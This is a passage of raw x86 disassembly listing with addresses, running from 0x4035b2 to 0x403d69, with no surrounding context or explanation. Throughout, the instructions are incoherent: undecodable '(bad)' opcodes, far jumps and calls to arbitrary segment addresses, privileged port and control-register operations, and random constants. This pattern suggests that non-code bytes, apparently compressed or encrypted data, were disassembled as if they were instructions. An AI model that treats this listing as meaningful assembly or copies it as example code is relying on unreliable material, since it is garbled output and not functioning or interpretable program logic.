  4035b2:	loop   0x4035c0
  4035b4:	dec    ebp
  4035b5:	jp     0x4035d7
  4035b7:	fstp   QWORD PTR [ebp+0x0]
  4035ba:	data16 add BYTE PTR [eax],al
  4035bd:	add    BYTE PTR [eax],al
  4035bf:	add    bh,bl
  4035c1:	jb     0x4035e9
  4035c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035c4:	into   
  4035c5:	add    ah,BYTE PTR ds:0x32648e3c
  4035cb:	adc    bl,BYTE PTR [ebp+eiz*2-0x5]
  4035cf:	sbb    ah,BYTE PTR [bx-0x3c]
  4035d3:	mov    ebp,0x84e166d0
  4035d8:	test   BYTE PTR [ebp-0x32],bl
  4035db:	stos   BYTE PTR es:[edi],al
  4035dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035dd:	pop    esp
  4035de:	call   DWORD PTR [eax-0x20]
  4035e1:	pop    esi
  4035e2:	sub    bh,dh
  4035e4:	sub    ebx,DWORD PTR [edi+0x2d]
  4035e7:	in     eax,dx
  4035e8:	bound  esp,QWORD PTR [edx+0x5a]
  4035eb:	inc    ebx
  4035ec:	(bad)  
  4035ed:	arpl   WORD PTR [ebx+0x6c61c9b9],ax
  4035f3:	pop    DWORD PTR [ebx]
  4035f5:	pusha  
  4035f6:	sbb    DWORD PTR [ebx],esi
  4035f8:	xor    DWORD PTR [edi+0x46],ebp
  4035fb:	sbb    eax,0x5f776e7b
  403600:	mov    ch,0x6c
  403602:	pusha  
  403603:	leave  
  403604:	imul   DWORD PTR [ebp+esi*8-0x26]
  403608:	sub    BYTE PTR [eax-0x1e],dh
  40360b:	je     0x40358f
  40360d:	jno    0x40359a
  40360f:	push   es
  403610:	mov    esp,0xee20b473
  403615:	jno    0x4035a8
  403617:	loope  0x40363c
  403619:	jns    0x4035b9
  40361b:	dec    ebx
  40361c:	mov    BYTE PTR [eax-0x11],bh
  40361f:	lods   eax,DWORD PTR ds:[esi]
  403620:	inc    esi
  403621:	jp     0x4035db
  403623:	xchg   edi,eax
  403624:	add    BYTE PTR [eax],al
  403626:	add    BYTE PTR [eax],al
  403628:	add    BYTE PTR [ebx+edi*2],al
  40362b:	popf   
  40362c:	mov    DWORD PTR [ebx+0x71a36a75],edi
  403632:	ja     0x4035e7
  403634:	push   ebp
  403635:	das    
  403636:	jne    0x4035f4
  403638:	out    dx,eax
  403639:	jmp    0x4402:0x7503e973
  403640:	pop    ds
  403641:	icebp  
  403642:	jns    0x403644
  403644:	bound  edi,QWORD PTR [esi+0x1bbfaa0a]
  40364a:	outs   dx,DWORD PTR ds:[esi]
  40364b:	adc    bh,BYTE PTR [esi]
  40364d:	jmp    0x37d3:0xc6db8f1f
  403654:	mov    ch,0x23
  403656:	sub    DWORD PTR ds:0x9dcb7e50,esp
  40365c:	xchg   esi,eax
  40365d:	mov    ?,WORD PTR [eax-0x3b]
  403660:	jae    0x40361d
  403662:	or     bh,BYTE PTR [ebp+0xd]
  403665:	adc    DWORD PTR [esi+0x6f],esi
  403668:	call   0xa2173850
  40366d:	jecxz  0x40363b
  40366f:	dec    edx
  403670:	cmp    al,0x2e
  403672:	sub    edx,esi
  403674:	sbb    bl,BYTE PTR [edx+0x66b7e0d3]
  40367a:	pop    ds
  40367b:	pop    eax
  40367c:	stos   WORD PTR es:[edi],ax
  40367e:	sbb    DWORD PTR [eax+0x43],edx
  403681:	es pop edi
  403683:	call   0xfa533a65
  403688:	mov    eax,0x314266de
  40368d:	add    BYTE PTR [eax],al
  40368f:	add    BYTE PTR [eax],al
  403691:	add    BYTE PTR [esi],dh
  403693:	cmp    bh,bl
  403695:	dec    esp
  403696:	mov    bl,0xbb
  403698:	stos   BYTE PTR es:[di],al
  40369a:	jle    0x4036cc
  40369c:	jne    0x403665
  40369e:	pop    ebx
  40369f:	(bad)  
  4036a0:	int    0x79
  4036a2:	inc    ebx
  4036a3:	gs xchg ebp,eax
  4036a5:	aam    0x8e
  4036a7:	adc    DWORD PTR ds:0x3f5e58f2,ebp
  4036ad:	dec    edi
  4036ae:	(bad)  
  4036af:	sbb    al,BYTE PTR [edi+0x1ac4090e]
  4036b5:	sub    edi,eax
  4036b7:	das    
  4036b8:	mov    ds:0xb0bdd185,al
  4036bd:	mov    al,ds:0x83880
  4036c2:	jb     0x4036e1
  4036c4:	xor    ah,BYTE PTR [eax+0x188ec657]
  4036ca:	sub    DWORD PTR ds:0xfefc0a3b,edx
  4036d0:	xchg   BYTE PTR [edx+0x2f4fb685],dh
  4036d6:	mov    al,ds:0xfe97ec4e
  4036db:	outs   dx,BYTE PTR ds:[esi]
  4036dc:	pop    ecx
  4036dd:	test   DWORD PTR [ebx],ebx
  4036df:	test   ebp,esp
  4036e1:	cmp    eax,0x658635dd
  4036e6:	test   al,0x5e
  4036e8:	cmp    bl,ch
  4036ea:	xchg   BYTE PTR ds:0xa713cf8f,bh
  4036f0:	xor    dh,BYTE PTR [edi-0x36]
  4036f3:	push   cs
  4036f4:	in     al,0xea
  4036f6:	add    BYTE PTR [eax],al
  4036f8:	add    BYTE PTR [eax],al
  4036fa:	add    BYTE PTR [edi+0x515257e5],bh
  403700:	xlat   BYTE PTR ds:[ebx]
  403701:	in     eax,dx
  403702:	inc    eax
  403703:	xor    al,0x2e
  403705:	push   ecx
  403706:	clc    
  403707:	in     eax,dx
  403708:	jne    0x403735
  40370a:	lock pop eax
  40370c:	lea    edx,[edi+0x21ae7648]
  403712:	pop    edx
  403713:	add    eax,DWORD PTR [esi-0x62]
  403716:	loop   0x403792
  403718:	fisttp QWORD PTR [eax+0x7f]
  40371b:	pop    DWORD PTR [esi]
  40371d:	cmc    
  40371e:	(bad)  
  40371f:	loope  0x403776
  403721:	inc    eax
  403722:	aad    0x4
  403724:	mov    edi,0xcec26dfc
  403729:	lahf   
  40372a:	xor    eax,0x8d2325c7
  40372f:	cdq    
  403730:	push   ss
  403731:	xchg   esi,eax
  403732:	lahf   
  403733:	sub    al,0xed
  403735:	sub    DWORD PTR [edi],esp
  403737:	jne    0x40372e
  403739:	cld    
  40373a:	mov    edx,0x2409e30
  40373f:	jne    0x403778
  403741:	test   ah,dh
  403743:	gs int3 
  403745:	stos   DWORD PTR es:[edi],eax
  403746:	dec    eax
  403747:	or     eax,0xe145bfe
  40374c:	loope  0x403742
  40374e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40374f:	push   esi
  403750:	xor    edx,DWORD PTR [ebx-0x53679be3]
  403756:	mov    eax,ds:0x76c50eec
  40375b:	imul   esp,DWORD PTR [ebx+ebp*2+0xca],0x89d90000
  403766:	cld    
  403767:	jle    0x40372c
  403769:	sbb    al,0x23
  40376b:	ret    
  40376c:	jae    0x403705
  40376e:	xor    esp,DWORD PTR [eax+0x1c0bf8d3]
  403774:	push   ebx
  403775:	adc    edi,DWORD PTR [ecx+ebp*4+0x69]
  403779:	pusha  
  40377a:	aam    0x15
  40377c:	test   eax,0x24c29c1e
  403781:	cmp    al,0x83
  403783:	jle    0x403761
  403785:	test   eax,0xc4becae4
  40378a:	dec    ebx
  40378b:	ja     0x4037c3
  40378d:	jle    0x403793
  40378f:	or     eax,0xb12ae93e
  403794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403795:	add    bh,BYTE PTR [ebp+0x638f9404]
  40379b:	mov    eax,0x6f9b0f3c
  4037a0:	mov    ecx,0x9d3b42b
  4037a5:	call   0xd9ec:0xb5136653
  4037ac:	mov    ds:0x83b8dc76,eax
  4037b1:	rol    DWORD PTR [ebx+0x5],cl
  4037b4:	and    esp,edx
  4037b6:	mov    ds:0x8b3d19b0,eax
  4037bb:	or     al,0x79
  4037bd:	add    al,BYTE PTR [ebx]
  4037bf:	je     0x40376f
  4037c1:	sbb    DWORD PTR [esi-0x25],0x52
  4037c5:	jmp    0x40383e
  4037c7:	sub    al,0x0
  4037c9:	add    BYTE PTR [eax],al
  4037cb:	add    BYTE PTR [eax],al
  4037cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ce:	fst    st(4)
  4037d0:	adc    ecx,DWORD PTR [ebx-0x6b]
  4037d3:	jmp    0xf94:0x46ed5bba
  4037da:	xchg   BYTE PTR [ecx-0xd],ah
  4037dd:	push   ebx
  4037de:	xchg   ebx,eax
  4037df:	mov    esp,0x3cdc064c
  4037e4:	and    al,0x39
  4037e6:	jbe    0x4037c0
  4037e8:	or     cl,BYTE PTR [ebp+0x305cb5fe]
  4037ee:	adc    BYTE PTR [ebx-0x3d],dl
  4037f1:	test   BYTE PTR [eax-0x6b],ch
  4037f4:	rol    DWORD PTR [edi],cl
  4037f6:	mov    al,0x70
  4037f8:	ins    BYTE PTR es:[edi],dx
  4037f9:	fwait
  4037fa:	dec    eax
  4037fb:	push   cs
  4037fc:	sbb    edi,esi
  4037fe:	push   ebp
  4037ff:	jmp    0x403834
  403801:	xchg   edx,eax
  403802:	sahf   
  403803:	mov    ds:0x3f33453c,al
  403808:	jecxz  0x4037c8
  40380a:	mov    ebx,0xcd3c8419
  40380f:	mov    ah,0xaa
  403811:	mov    al,0x25
  403813:	gs fs jb 0x403834
  403817:	inc    eax
  403818:	retf   
  403819:	not    ah
  40381b:	ficomp WORD PTR [ebx]
  40381d:	imul   eax,ebx,0xffffffbb
  403820:	add    ch,bh
  403822:	sub    dh,BYTE PTR [edx]
  403824:	sti    
  403825:	mov    cl,0xa6
  403827:	dec    edi
  403828:	push   esp
  403829:	adc    al,0x4e
  40382b:	test   eax,0xc440a9b2
  403830:	mov    eax,DWORD PTR [eax]
  403832:	add    BYTE PTR [eax],al
  403834:	add    BYTE PTR [eax],al
  403836:	or     eax,0xfe7b7ab8
  40383b:	pop    edi
  40383c:	xlat   BYTE PTR ds:[ebx]
  40383d:	mov    ds:0xf10018a2,al
  403842:	test   BYTE PTR ss:[esp+ecx*2],al
  403846:	into   
  403847:	out    dx,al
  403848:	mov    ebx,0x219b660d
  40384d:	sub    BYTE PTR [ecx-0x607966a9],bl
  403853:	mov    eax,ds:0x4e46a38b
  403858:	xor    eax,DWORD PTR [edx]
  40385a:	das    
  40385b:	dec    ebx
  40385c:	in     eax,dx
  40385d:	pop    ds
  40385e:	shl    BYTE PTR [esi+0x52647955],0x47
  403865:	xchg   esp,eax
  403866:	imul   ebx,DWORD PTR [esi-0x1467ea01],0x893cf061
  403870:	fimul  DWORD PTR [esi+0x6bc7f3e1]
  403876:	hlt    
  403877:	jg     0x4038e9
  403879:	popf   
  40387a:	add    al,0x9e
  40387c:	sub    BYTE PTR [eax],bh
  40387e:	sbb    DWORD PTR [edx-0x70],edx
  403881:	push   ss
  403882:	mov    edi,0x61b382a6
  403887:	pop    eax
  403888:	cmp    ch,BYTE PTR [edx+0x51]
  40388b:	and    DWORD PTR [edi+0x1ef39447],0xd8939e1
  403895:	mov    esp,0x8db4eccc
  40389a:	add    BYTE PTR [eax],al
  40389c:	add    BYTE PTR [eax],al
  40389e:	add    cl,bl
  4038a0:	inc    edx
  4038a1:	mov    ebp,0x5aefc28
  4038a6:	push   es
  4038a7:	inc    eax
  4038a8:	cmp    edx,DWORD PTR [edi]
  4038aa:	mov    ds:0x1aafb5b4,eax
  4038af:	dec    esp
  4038b0:	in     al,0x31
  4038b2:	ja     0x403915
  4038b4:	nop
  4038b5:	mov    dl,BYTE PTR [ecx-0x1368247c]
  4038bb:	sub    DWORD PTR [eax+0x6f270020],ebx
  4038c1:	hlt    
  4038c2:	js     0x40387e
  4038c4:	and    DWORD PTR [eax-0x40],ecx
  4038c7:	mov    WORD PTR [esi],es
  4038c9:	std    
  4038ca:	shl    BYTE PTR [ecx],cl
  4038cc:	fld    DWORD PTR [eax+0x6a]
  4038cf:	js     0x403925
  4038d1:	xchg   esi,eax
  4038d2:	not    DWORD PTR [ebp-0x65]
  4038d5:	sub    DWORD PTR [edi+0x43],ecx
  4038d8:	mov    WORD PTR [edi+0x23739e5d],ds
  4038de:	in     eax,0xa1
  4038e0:	cld    
  4038e1:	push   0x4d
  4038e3:	cmp    al,0xf4
  4038e5:	(bad)  
  4038e6:	cmc    
  4038e7:	sbb    dl,bl
  4038e9:	(bad)  
  4038ea:	out    0xb7,eax
  4038ec:	sub    al,0xde
  4038ee:	pop    edi
  4038ef:	dec    esi
  4038f0:	test   BYTE PTR [ecx],cl
  4038f2:	ret    0x8ca3
  4038f5:	mov    ch,0x7a
  4038f7:	lds    edi,FWORD PTR [eax+eax*1]
  4038fa:	push   0xd0bba328
  4038ff:	push   es
  403900:	mov    bl,0xde
  403902:	mov    BYTE PTR [eax],al
  403904:	add    BYTE PTR [eax],al
  403906:	add    BYTE PTR [eax],al
  403908:	fisttp DWORD PTR [ebx+eiz*2+0x30]
  40390c:	ins    DWORD PTR es:[edi],dx
  40390d:	pop    ebx
  40390e:	(bad)  
  40390f:	and    dl,BYTE PTR [eax-0x6f]
  403912:	push   0xffffff9a
  403914:	sbb    DWORD PTR [edi*4+0x1c3b407],ebx
  40391b:	mov    edi,0xadb3e462
  403920:	jmp    FWORD PTR [ebx+0x44961507]
  403926:	jb     0x403945
  403928:	imul   ecx,ebx,0xffffffcd
  40392b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40392c:	cmp    eax,0xe0b77b79
  403931:	arpl   di,ax
  403933:	cmovns edi,DWORD PTR [ebx+0x34a49210]
  40393a:	lods   al,BYTE PTR ds:[esi]
  40393b:	sub    dh,BYTE PTR [ebp+0x5f]
  40393e:	adc    bl,BYTE PTR [ecx]
  403940:	cmp    eax,0xf5a539bc
  403945:	sub    eax,0xc8cdc629
  40394a:	add    bh,BYTE PTR [edx+0x55]
  40394d:	mov    bh,0x61
  40394f:	iret   
  403950:	addr16 push esp
  403952:	mov    ebx,0xb2fabf73
  403957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403958:	and    ch,al
  40395a:	cdq    
  40395b:	sbb    dl,dl
  40395d:	sub    edx,0x518cb8ac
  403963:	adc    DWORD PTR [eax],edi
  403965:	lahf   
  403966:	mov    eax,ds:0x7b3c234d
  40396b:	icebp  
  40396c:	add    BYTE PTR [eax],al
  40396e:	add    BYTE PTR [eax],al
  403970:	add    BYTE PTR [ebx-0x46bc16db],dh
  403976:	rol    BYTE PTR [edx-0x8],0x19
  40397a:	jmp    0x9311:0xd48c2f2a
  403981:	xor    al,0x73
  403983:	jb     0x4039ab
  403985:	es inc eax
  403987:	fstp   DWORD PTR [edx-0x6366ca2]
  40398d:	and    BYTE PTR es:[edx+0x45],ah
  403991:	outs   dx,BYTE PTR ds:[esi]
  403992:	stc    
  403993:	add    eax,esi
  403995:	jl     0x40393b
  403997:	sbb    cl,BYTE PTR [esp+edx*1+0x66]
  40399b:	push   edx
  40399c:	fwait
  40399d:	mov    DWORD PTR [eax-0x7],eax
  4039a0:	es stc 
  4039a2:	push   cs
  4039a3:	mov    edx,DWORD PTR [edx+0x2eb16be3]
  4039a9:	arpl   WORD PTR [edx],sp
  4039ab:	push   0x54
  4039ad:	push   ebx
  4039ae:	out    dx,eax
  4039af:	shr    al,1
  4039b1:	add    ecx,edx
  4039b3:	xor    bl,BYTE PTR [ebp-0x17]
  4039b6:	je     0x4039d1
  4039b8:	loope  0x403a03
  4039ba:	add    dh,BYTE PTR [edi]
  4039bc:	loope  0x4039fe
  4039be:	pop    ebx
  4039bf:	push   edx
  4039c0:	cmp    ch,bh
  4039c2:	adc    ebp,DWORD PTR [ecx+ebp*4-0x7d36fec6]
  4039c9:	imul   BYTE PTR [ecx+0x7f]
  4039cc:	xchg   edx,eax
  4039cd:	aad    0xa1
  4039cf:	fidivr DWORD PTR [ecx+0x49f44941]
  4039d5:	add    BYTE PTR [eax],al
  4039d7:	add    BYTE PTR [eax],al
  4039d9:	add    ah,cl
  4039db:	cmp    edx,DWORD PTR [ecx-0xf]
  4039de:	sub    DWORD PTR [ebx+0x1ef70608],esi
  4039e4:	and    eax,0x83d68325
  4039e9:	mov    esi,0x5d9ec4ee
  4039ee:	push   0x2c
  4039f0:	add    DWORD PTR [ebp+0x2a],eax
  4039f3:	aam    0x1c
  4039f5:	out    0xb7,al
  4039f7:	sbb    al,0x7a
  4039f9:	jge    0x403a1e
  4039fb:	cs xchg edi,eax
  4039fd:	sahf   
  4039fe:	mov    edi,0x68d616c6
  403a03:	dec    ebx
  403a04:	repz je 0x4039db
  403a07:	mov    ds:0xb1610e8d,eax
  403a0c:	push   0x9e391d2d
  403a11:	sbb    eax,0xfe3b113e
  403a16:	jmp    0x403a71
  403a18:	adc    eax,0xb06b3765
  403a1d:	(bad)
  403a20:	imul   ebp,DWORD PTR [esi-0x72bb71e4],0xf5e1e668
  403a2a:	(bad)  
  403a2c:	mov    esi,0x8e7c9154
  403a31:	push   ss
  403a32:	xchg   ebx,eax
  403a33:	test   BYTE PTR [ebx],ch
  403a35:	xor    eax,0x4ffec3f
  403a3a:	sub    ebx,DWORD PTR ds:0xa02c
  403a40:	add    BYTE PTR [eax],al
  403a42:	add    BYTE PTR [ecx-0xfe66b2f],ah
  403a48:	add    eax,0x69db7409
  403a4d:	mov    cl,0x92
  403a4f:	cmp    edi,edi
  403a51:	mov    ds:0x1b71d0ef,al
  403a56:	mov    cl,0xd8
  403a58:	rol    BYTE PTR [ebx-0x34],cl
  403a5b:	xor    DWORD PTR [ebx+edi*8],ebx
  403a5e:	sub    ah,BYTE PTR [ebx]
  403a60:	leave  
  403a61:	jmp    0x516522ad
  403a66:	push   es
  403a67:	sub    BYTE PTR [edx-0x34],dh
  403a6a:	arpl   WORD PTR [ebx],ax
  403a6c:	(bad)  
  403a6d:	jae    0x403aec
  403a6f:	xchg   ecx,eax
  403a70:	imul   esp,DWORD PTR [esi-0x28],0x78
  403a74:	pop    es
  403a75:	fsubp  st(1),st
  403a77:	jbe    0x403a7b
  403a79:	add    BYTE PTR [esi],dh
  403a7b:	jp     0x403a6f
  403a7d:	xchg   ebp,eax
  403a7e:	(bad)  
  403a7f:	cwde   
  403a80:	and    DWORD PTR [eax+edx*2],ebp
  403a83:	xchg   ecx,eax
  403a84:	push   ecx
  403a85:	mov    edx,0x19c655ee
  403a8a:	sbb    DWORD PTR [edi-0x4a],ebx
  403a8d:	pop    DWORD PTR [eax+0x6f356757]
  403a93:	call   0x327b:0x3ff7a395
  403a9a:	add    BYTE PTR [ebp+0x6b],al
  403a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a9e:	mov    DWORD PTR ds:0x24561e9a,edi
  403aa4:	retf   0xf088
  403aa7:	add    BYTE PTR [eax],al
  403aa9:	add    BYTE PTR [eax],al
  403aab:	add    al,al
  403aad:	ds sub ebx,edi
  403ab0:	leave  
  403ab1:	cs mov ebp,0x6ddce4e
  403ab7:	jns    0x403a5c
  403ab9:	or     eax,0x35110091
  403abe:	adc    BYTE PTR [esi+eax*2+0x30],ah
  403ac2:	and    dl,dh
  403ac4:	pop    edi
  403ac5:	push   ds
  403ac6:	jno    0x403b10
  403ac8:	cwde   
  403ac9:	sbb    eax,0xb876de41
  403ace:	aam    0x7d
  403ad0:	icebp  
  403ad1:	shl    ah,cl
  403ad3:	jmp    0x403b2d
  403ad5:	shl    DWORD PTR [ebp-0x7a2fa0af],cl
  403adb:	(bad)  
  403adc:	iret   
  403add:	or     ebx,DWORD PTR [eax-0x57f707aa]
  403ae3:	shl    cl,0xe2
  403ae6:	clc    
  403ae7:	jp     0x403b3f
  403ae9:	fcmove st,st(0)
  403aeb:	in     al,dx
  403aec:	enter  0x5c00,0x4f
  403af0:	das    
  403af1:	add    al,0x6c
  403af3:	fldenv [esi+0x51633cad]
  403af9:	scas   al,BYTE PTR es:[edi]
  403afa:	or     al,0xf5
  403afc:	ja     0x403b0a
  403afe:	and    al,cl
  403b00:	push   eax
  403b01:	pop    es
  403b02:	adc    BYTE PTR [esi-0x7],bl
  403b05:	out    0x40,al
  403b07:	in     al,0xfe
  403b09:	in     eax,0x70
  403b0b:	jb     0x403a9d
  403b0d:	add    ah,ah
  403b0f:	rol    DWORD PTR [eax],1
  403b11:	add    BYTE PTR [eax],al
  403b13:	add    BYTE PTR [eax],al
  403b15:	inc    edi
  403b16:	cli    
  403b17:	rol    DWORD PTR [edi-0x42],cl
  403b1a:	stos   DWORD PTR es:[edi],eax
  403b1b:	test   ch,bh
  403b1d:	mov    ecx,0x296bb4a8
  403b22:	xor    al,0xa8
  403b24:	cli    
  403b25:	mov    ?,WORD PTR [eax]
  403b27:	cwde   
  403b28:	ins    BYTE PTR es:[edi],dx
  403b29:	pop    es
  403b2a:	sbb    ecx,ecx
  403b2c:	(bad)  
  403b2d:	nop
  403b2e:	xor    bh,cl
  403b30:	inc    eax
  403b31:	outs   dx,BYTE PTR ds:[esi]
  403b32:	mov    esi,0xbe19e36c
  403b37:	pop    esp
  403b38:	jne    0x403baf
  403b3a:	cmc    
  403b3b:	aad    0xd
  403b3d:	inc    edx
  403b3e:	adc    bl,0x3d
  403b41:	int3   
  403b42:	sti    
  403b43:	retf   0xd130
  403b46:	mov    ebp,ecx
  403b48:	add    BYTE PTR [edi-0x1f],bl
  403b4b:	aam    0x51
  403b4d:	cmc    
  403b4e:	sbb    edx,esp
  403b50:	popa   
  403b51:	arpl   WORD PTR [edx+0x72c8f477],di
  403b57:	jo     0x403b1d
  403b59:	push   esi
  403b5a:	in     al,0x69
  403b5c:	xchg   ebp,eax
  403b5d:	or     al,0x51
  403b5f:	outs   dx,DWORD PTR ds:[esi]
  403b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b61:	jp     0x403b34
  403b63:	add    DWORD PTR [eax-0x77f973fd],edi
  403b69:	ins    DWORD PTR es:[edi],dx
  403b6a:	(bad)  
  403b6c:	fadd   DWORD PTR [edi]
  403b6e:	jmp    0x7c1d:0x1491e8f8
  403b75:	cli    
  403b76:	inc    eax
  403b77:	sbb    al,0x4c
  403b79:	add    BYTE PTR [eax],al
  403b7b:	add    BYTE PTR [eax],al
  403b7d:	add    BYTE PTR [edx+ebx*2+0x22],ah
  403b81:	sbb    eax,0x2d2592de
  403b86:	push   0x541cfeb
  403b8b:	call   0x20d1:0x517371c8
  403b92:	shr    DWORD PTR [ebx-0x2a],1
  403b95:	adc    BYTE PTR [edi+0xa],bl
  403b98:	jae    0x403b1f
  403b9a:	in     al,dx
  403b9b:	mov    ds:0x345ab575,al
  403ba0:	ins    BYTE PTR es:[edi],dx
  403ba1:	in     al,0x18
  403ba3:	test   BYTE PTR [ebx-0x2c],ch
  403ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ba7:	add    eax,DWORD PTR ds:0x39917c9
  403bad:	stc    
  403bae:	mov    eax,ds:0x3a7fa49
  403bb3:	jnp    0x403bb2
  403bb5:	xchg   edi,eax
  403bb6:	ins    DWORD PTR es:[edi],dx
  403bb7:	add    ah,dh
  403bb9:	sbb    DWORD PTR [eax+0x6d],esi
  403bbc:	icebp  
  403bbd:	push   ds
  403bbe:	js     0x403b97
  403bc0:	ja     0x403be9
  403bc2:	mov    eax,ds:0xc9204791
  403bc7:	add    edx,edx
  403bc9:	sbb    ah,al
  403bcb:	scas   al,BYTE PTR es:[edi]
  403bcc:	fstp   QWORD PTR [edi]
  403bce:	xchg   esp,eax
  403bcf:	and    al,0x6c
  403bd1:	es inc ebp
  403bd3:	retf   0x213b
  403bd6:	jne    0x403c10
  403bd8:	xchg   ebp,eax
  403bd9:	add    eax,0x30297e8
  403bde:	shr    BYTE PTR ds:0xfb6b,1
  403be4:	add    BYTE PTR [eax],al
  403be6:	add    dh,ah
  403be8:	ret    
  403be9:	adc    al,0xfc
  403beb:	mov    dh,0x51
  403bed:	mov    WORD PTR [ebx-0x44],?
  403bf0:	rcr    bl,0x74
  403bf3:	int3   
  403bf4:	push   edx
  403bf5:	bound  ebp,QWORD PTR [ebp+0xd]
  403bf8:	popf   
  403bf9:	in     eax,dx
  403bfa:	imul   edi,ebp,0x60c94b26
  403c00:	leave  
  403c01:	hlt    
  403c02:	int    0x88
  403c04:	cmp    esp,DWORD PTR [ebp-0x29]
  403c07:	xor    DWORD PTR [ebp+0x1f39d0d2],esi
  403c0d:	xor    al,0x76
  403c0f:	adc    al,0x4a
  403c11:	add    esi,DWORD PTR [ecx+0x44]
  403c14:	mov    eax,0x2e75688a
  403c19:	xchg   ebp,eax
  403c1a:	outs   dx,DWORD PTR ds:[esi]
  403c1b:	inc    ebp
  403c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c1d:	xor    ecx,ebx
  403c1f:	fadd   DWORD PTR [ebx-0x24]
  403c22:	retf   
  403c23:	loopne 0x403bf6
  403c25:	dec    ebp
  403c26:	aad    0x39
  403c28:	pop    ss
  403c29:	mov    edx,0x2aad61d2
  403c2e:	sbb    eax,0x19b51c4c
  403c33:	cmp    al,0xa6
  403c35:	add    BYTE PTR [esi+edx*4+0x7a],al
  403c39:	inc    esi
  403c3a:	xchg   ebx,eax
  403c3b:	xchg   ecx,eax
  403c3c:	push   0xffffffd0
  403c3e:	lods   eax,DWORD PTR ds:[esi]
  403c3f:	inc    edx
  403c40:	(bad)  
  403c41:	jb     0x403c5d
  403c43:	jb     0x403c4c
  403c45:	in     eax,0x83
  403c47:	xor    edi,DWORD PTR ds:0x2c5f
  403c4d:	add    BYTE PTR [eax],al
  403c4f:	add    BYTE PTR [ebp*1+0x337599c9],ch
  403c56:	cmp    al,0x6
  403c58:	jae    0x403c9d
  403c5a:	stos   BYTE PTR es:[edi],al
  403c5b:	ja     0x403c6f
  403c5d:	stc    
  403c5e:	mov    ebp,cr1
  403c61:	or     DWORD PTR [esi+0x256f5ebe],eax
  403c67:	leave  
  403c68:	pop    edi
  403c69:	jg     0x403c1e
  403c6b:	push   eax
  403c6c:	xchg   edi,eax
  403c6d:	into   
  403c6e:	or     DWORD PTR [edi],ebx
  403c70:	nop
  403c71:	sahf   
  403c72:	lahf   
  403c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c74:	lods   al,BYTE PTR ds:[esi]
  403c75:	stos   BYTE PTR es:[edi],al
  403c76:	push   cs
  403c77:	shr    BYTE PTR [ecx-0x56c66746],1
  403c7d:	mov    DWORD PTR [edx],esp
  403c7f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  403c81:	pop    ecx
  403c82:	mov    ah,0x40
  403c84:	dec    edx
  403c85:	out    0x16,eax
  403c87:	cmovne esi,edi
  403c8a:	sbb    BYTE PTR [esi-0x56c4b9e3],0x18
  403c91:	push   ss
  403c92:	lods   eax,DWORD PTR ds:[esi]
  403c93:	aam    0xe
  403c95:	test   DWORD PTR [eax],esp
  403c97:	arpl   WORD PTR [edi],cx
  403c99:	jne    0x403c51
  403c9b:	jmp    0xd400:0x350ca404
  403ca2:	call   0xa07c:0x3940a593
  403ca9:	xor    BYTE PTR [edi+0x14e143ed],ch
  403caf:	sbb    bh,BYTE PTR ds:0x8311
  403cb5:	add    BYTE PTR [eax],al
  403cb7:	add    BYTE PTR [eax],al
  403cb9:	out    dx,eax
  403cba:	loopne 0x403cc6
  403cbc:	adc    al,al
  403cbe:	pop    es
  403cbf:	cmp    eax,DWORD PTR [ecx+ebx*2+0x463e6a0b]
  403cc6:	push   es
  403cc7:	pop    edx
  403cc8:	test   al,0xb0
  403cca:	test   eax,0xa6bf0bce
  403ccf:	(bad)  
  403cd0:	popf   
  403cd1:	push   ss
  403cd2:	add    al,0xae
  403cd4:	daa    
  403cd5:	cmp    DWORD PTR ds:0xac5cb19e,eax
  403cdb:	xchg   edx,eax
  403cdc:	inc    esp
  403cdd:	xchg   ebx,eax
  403cde:	stos   DWORD PTR es:[edi],eax
  403cdf:	mov    ds:0xf1ff2ad2,al
  403ce4:	push   0xfec20235
  403ce9:	arpl   bp,bx
  403ceb:	push   esi
  403cec:	pop    ebp
  403ced:	mov    edx,fs
  403cef:	retfw  
  403cf1:	in     eax,0xf
  403cf3:	ss jno 0x403d60
  403cf6:	or     BYTE PTR [esi],al
  403cf8:	out    0x7a,eax
  403cfa:	mov    bh,0x1b
  403cfc:	jbe    0x403d63
  403cfe:	shr    BYTE PTR [ebx],1
  403d00:	loopne 0x403cae
  403d02:	mov    ch,0x7a
  403d04:	pop    edx
  403d05:	repz mov edx,0x1bd5cc4a
  403d0b:	fild   QWORD PTR [edi+0x4a]
  403d0e:	sbb    al,0xef
  403d10:	stc    
  403d11:	mov    bl,0x32
  403d13:	mov    esi,0x8e2e3c43
  403d18:	aad    0x2
  403d1a:	aad    0xa3
  403d1c:	call   0x403d21
  403d21:	add    ch,ch
  403d23:	rcl    DWORD PTR [ebx-0x3d447b82],cl
  403d29:	les    ebp,FWORD PTR [ebx-0x47]
  403d2c:	repnz push edx
  403d2e:	mov    ebp,0x32f16715
  403d33:	sbb    dl,BYTE PTR [edi+0x67]
  403d36:	jne    0x403d08
  403d38:	outs   dx,BYTE PTR ds:[esi]
  403d39:	push   es
  403d3a:	dec    eax
  403d3b:	loope  0x403db2
  403d3d:	ss scas al,BYTE PTR es:[edi]
  403d3f:	popa   
  403d40:	imul   DWORD PTR [edx]
  403d42:	aas    
  403d43:	cmp    dh,bh
  403d45:	sbb    al,cl
  403d47:	addr16 add al,0x4a
  403d4a:	inc    ebx
  403d4b:	(bad)  
  403d4d:	jns    0x403d24
  403d4f:	inc    eax
  403d50:	and    al,0xef
  403d52:	ss xchg ecx,eax
  403d54:	and    edi,ebx
  403d56:	enter  0x1a0a,0x8e
  403d5a:	sbb    bl,BYTE PTR [edi+0x1a]
  403d5d:	mov    esi,0xb322f49c
  403d62:	jmp    0x6fc35f8b
  403d67:	neg    BYTE PTR [eax]
  403d69:	rcl    ch,cl
